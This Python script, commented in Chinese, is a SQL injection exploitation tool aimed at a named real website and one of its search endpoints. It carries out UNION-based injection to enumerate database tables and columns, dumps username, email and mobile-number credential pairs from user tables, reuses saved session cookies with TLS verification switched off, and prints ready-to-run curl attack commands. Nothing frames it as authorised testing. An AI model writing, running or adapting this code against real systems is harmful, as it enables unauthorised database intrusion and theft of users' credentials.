#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
from urllib.parse import quote, urlencode
import urllib3
urllib3.disable_warnings()

class SQLiManual:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.extracted_data = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_union_columns(self, endpoint, param_name, param_value="1"):
        """测试Union列数"""
        print(f"\n[*] 测试Union列数: {endpoint}?{param_name}={param_value}")
        
        for cols in range(1, 21):
            payload = f"{param_value}' UNION SELECT {','.join(['NULL'] * cols)}--"
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and 'union' not in r.text.lower():
                    print(f"    [+] 列数: {cols}")
                    return cols
            except:
                pass
        return None
    
    def extract_db_version(self, endpoint, param_name, param_value="1", columns=3):
        """提取数据库版本"""
        print(f"\n[*] 提取数据库版本: {endpoint}")
        
        payloads = [
            f"{param_value}' UNION SELECT NULL,version(),NULL--",
            f"{param_value}' UNION SELECT NULL,NULL,version()--",
            f"{param_value}' UNION SELECT version(),NULL,NULL--",
        ]
        
        for i, payload in enumerate(payloads[:columns]):
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if 'version' in r.text.lower() or 'microsoft' in r.text.lower():
                    print(f"    [+] 版本信息: {r.text[:500]}")
                    self.extracted_data['version'] = r.text
                    return r.text
            except:
                pass
        return None
    
    def extract_database_name(self, endpoint, param_name, param_value="1", columns=3):
        """提取数据库名"""
        print(f"\n[*] 提取数据库名: {endpoint}")
        
        payloads = [
            f"{param_value}' UNION SELECT NULL,database(),NULL--",
            f"{param_value}' UNION SELECT NULL,NULL,database()--",
            f"{param_value}' UNION SELECT database(),NULL,NULL--",
        ]
        
        for payload in payloads[:columns]:
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    print(f"    [+] 数据库名: {r.text[:500]}")
                    self.extracted_data['database'] = r.text
                    return r.text
            except:
                pass
        return None
    
    def extract_tables(self, endpoint, param_name, param_value="1", columns=3, db_name=None):
        """提取表名"""
        print(f"\n[*] 提取表名: {endpoint}")
        
        if not db_name:
            db_name = "database()"
        else:
            db_name = f"'{db_name}'"
        
        payloads = [
            f"{param_value}' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema={db_name} LIMIT 0,1--",
            f"{param_value}' UNION SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema={db_name} LIMIT 0,1--",
            f"{param_value}' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema={db_name} LIMIT 0,1--",
        ]
        
        tables = []
        for payload in payloads[:columns]:
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    # 提取表名（从JSON或HTML中）
                    import re
                    table_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]{3,})', r.text)
                    if table_match:
                        table = table_match.group(1)
                        if table not in tables and 'information' not in table.lower():
                            tables.append(table)
                            print(f"    [+] 表名: {table}")
            except:
                pass
        
        # 批量提取表名
        for offset in range(0, 50, 1):
            payload = f"{param_value}' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema={db_name} LIMIT {offset},10--"
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.text) > 10:
                    print(f"    [+] 表名列表: {r.text[:500]}")
                    break
            except:
                pass
        
        return tables
    
    def extract_columns(self, endpoint, param_name, param_value="1", columns=3, table_name=None):
        """提取列名"""
        if not table_name:
            print("[-] 需要表名")
            return []
        
        print(f"\n[*] 提取列名: {table_name}")
        
        payloads = [
            f"{param_value}' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 0,1--",
            f"{param_value}' UNION SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 0,1--",
            f"{param_value}' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 0,1--",
        ]
        
        cols = []
        for payload in payloads[:columns]:
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    import re
                    col_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', r.text)
                    if col_match:
                        col = col_match.group(1)
                        if col not in cols:
                            cols.append(col)
                            print(f"    [+] 列名: {col}")
            except:
                pass
        
        # 批量提取
        payload = f"{param_value}' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='{table_name}'--"
        url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
        try:
            r = self.session.get(url, timeout=10)
            if r.status_code == 200:
                print(f"    [+] 列名列表: {r.text[:500]}")
        except:
            pass
        
        return cols
    
    def extract_table_data(self, endpoint, param_name, param_value="1", columns=3, table_name=None, column_names=None):
        """提取表数据"""
        if not table_name:
            return None
        
        print(f"\n[*] 提取数据: {table_name}")
        
        if not column_names:
            column_names = ["*"]
        else:
            column_names = [column_names] if isinstance(column_names, str) else column_names
        
        for cols in column_names:
            payload = f"{param_value}' UNION SELECT NULL,{cols},NULL FROM {table_name} LIMIT 0,10--"
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.text) > 50:
                    print(f"    [+] 数据: {r.text[:1000]}")
                    self.extracted_data[f'{table_name}_data'] = r.text
                    return r.text
            except:
                pass
        
        return None
    
    def exploit_user_table(self, endpoint, param_name, param_value="1", columns=3):
        """利用用户表"""
        print(f"\n[*] 利用用户表: {endpoint}")
        
        # 提取用户表数据
        user_payloads = [
            f"{param_value}' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users LIMIT 0,10--",
            f"{param_value}' UNION SELECT NULL,CONCAT(UserName,':',Password),NULL FROM Account LIMIT 0,10--",
            f"{param_value}' UNION SELECT NULL,CONCAT(MobileNumber,':',Password),NULL FROM User LIMIT 0,10--",
            f"{param_value}' UNION SELECT NULL,CONCAT(Email,':',Password),NULL FROM Users LIMIT 0,10--",
        ]
        
        for payload in user_payloads:
            url = f"{self.base_url}{endpoint}?{param_name}={quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.text) > 50:
                    print(f"    [!] 用户凭证: {r.text[:500]}")
                    self.extracted_data['users'] = r.text
                    return r.text
            except:
                pass
        
        return None
    
    def generate_curl_commands(self, endpoint, param_name, param_value="1"):
        """生成curl命令"""
        print(f"\n[*] 生成curl命令: {endpoint}")
        
        commands = []
        
        # Union测试
        union_payload = f"{param_value}' UNION SELECT NULL,version(),NULL--"
        curl_cmd = f"""curl -k '{self.base_url}{endpoint}?{param_name}={quote(union_payload)}' \\
  -H 'Cookie: {self.get_cookie_string()}' \\
  -H 'User-Agent: Mozilla/5.0'"""
        commands.append(("Union注入测试", curl_cmd))
        
        # 表名提取
        table_payload = f"{param_value}' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--"
        curl_cmd = f"""curl -k '{self.base_url}{endpoint}?{param_name}={quote(table_payload)}' \\
  -H 'Cookie: {self.get_cookie_string()}' \\
  -H 'User-Agent: Mozilla/5.0'"""
        commands.append(("提取表名", curl_cmd))
        
        return commands
    
    def get_cookie_string(self):
        """获取Cookie字符串"""
        cookies = []
        for name, value in self.session.cookies.get_dict().items():
            cookies.append(f"{name}={value}")
        return '; '.join(cookies)
    
    def run_manual_exploit(self):
        """手动利用流程"""
        print("="*60)
        print("SQL注入手动利用")
        print("="*60)
        
        # 目标端点
        target_endpoint = "/Handle/SearchListProvince"
        param_name = "Type"
        param_value = "1"
        
        print(f"\n目标: {target_endpoint}")
        print(f"参数: {param_name}={param_value}")
        
        # 1. 测试列数
        cols = self.test_union_columns(target_endpoint, param_name, param_value)
        if not cols:
            cols = 3  # 默认3列
        
        # 2. 提取数据库版本
        self.extract_db_version(target_endpoint, param_name, param_value, cols)
        
        # 3. 提取数据库名
        self.extract_database_name(target_endpoint, param_name, param_value, cols)
        
        # 4. 提取表名
        tables = self.extract_tables(target_endpoint, param_name, param_value, cols)
        
        # 5. 提取用户表数据
        if tables:
            for table in tables[:5]:  # 前5个表
                if any(keyword in table.lower() for keyword in ['user', 'account', 'admin', 'customer']):
                    self.extract_columns(target_endpoint, param_name, param_value, cols, table)
                    self.extract_table_data(target_endpoint, param_name, param_value, cols, table)
        
        # 6. 利用用户表
        self.exploit_user_table(target_endpoint, param_name, param_value, cols)
        
        # 7. 生成curl命令
        curl_commands = self.generate_curl_commands(target_endpoint, param_name, param_value)
        
        # 保存结果
        with open('sqli_manual_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'extracted_data': self.extracted_data,
                'curl_commands': curl_commands
            }, f, indent=2, ensure_ascii=False)
        
        print(f"\n[*] 生成curl命令:")
        for name, cmd in curl_commands:
            print(f"\n# {name}")
            print(cmd)

if __name__ == "__main__":
    sqli = SQLiManual()
    sqli.run_manual_exploit()